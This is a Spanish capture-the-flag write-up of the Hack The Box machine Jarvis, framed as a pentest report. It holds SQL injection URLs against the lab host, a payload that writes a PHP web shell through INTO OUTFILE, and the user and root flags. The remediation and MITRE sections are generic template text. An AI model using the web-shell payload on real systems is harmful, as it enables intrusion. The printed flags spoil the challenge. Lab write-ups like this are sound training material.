---
title: "Informe Técnico: Jarvis (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Jarvis de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Jarvis

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Jarvis** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Jarvis |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many open TCP ports are listening on Jarvis?**

R: 3

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_01.png)

**What is the GET parameter on the website on TCP 80 that is vulnerable to SQL injection?**

R: cod

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_02.png)

**How many columns are in the table being injected into?**

R: 7

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_03.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_04.png)

**Can the user that the website uses to connect to the DB, write files to the host file system?**

R: yes

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_05.png)

> 
> 
> 
> ## ✅ Paso a paso para probar `INTO OUTFILE`
> 
> ### 1. Asegúrate de que la inyección funciona
> 
> Tú ya hiciste:
> 
> ```bash
> bash
> CopiarEditar
> http://10.10.10.143/room.php?cod=4 UNION SELECT 1,2,3,4,5,6,7-- -
> 
> ```
> 
> Si eso devuelve contenido, puedes pasar al siguiente paso.
> 
> ---
> 
> ### 2. Prueba `INTO OUTFILE` para escribir un archivo
> 
> **Ejemplo:**
> 
> ```bash
> bash
> CopiarEditar
> http://10.10.10.143/room.php?cod=4 UNION SELECT 1,2,"<?php system($_GET['cmd']); ?>",4,5,6,7 INTO OUTFILE '/var/www/html/shell.php'-- -
> 
> ```
> 
> **¿Qué hace esto?**
> 
> - Intenta escribir un archivo `shell.php` con contenido PHP (`<?php system($_GET['cmd']); ?>`) en `/var/www/html/`.
> - Si tiene éxito, luego podrás acceder con:
> 
> ```
> bash
> CopiarEditar
> http://10.10.10.143/shell.php?cmd=id
> 
> ```
> 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_06.png)

What is the full path of the directory that serves as the web root?

R:  /var/www/html

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_07.png)

What programming language is this website written in?

R: php

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_08.png)

**What user is the website running as?**

R: www-data

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_09.png)

**What is the full path to the Python script that www-data can run as the pepper user without a password?**

R: /var/www/Admin-Utilities/simpler.py

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_10.png)

**What Python function in `simpler.py` is used to execute a command on the operating system?**

R:os.system

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_11.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_12.png)

**Submit the flag located in the pepper user's home directory.**

R: c90f7d53d3dfa887fc471f9522055383

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_13.png)

**What is the full path to the SetUID binary owned by the root user and the pepper group on Jarvis?**

R: /bin/systemctl

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_14.png)

**Submit the flag located in the root user's home directory.**

R: 6dfae8cbc7751394e0ef58e91fcc7e7b

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_15.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/jarvis/images/step_16.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
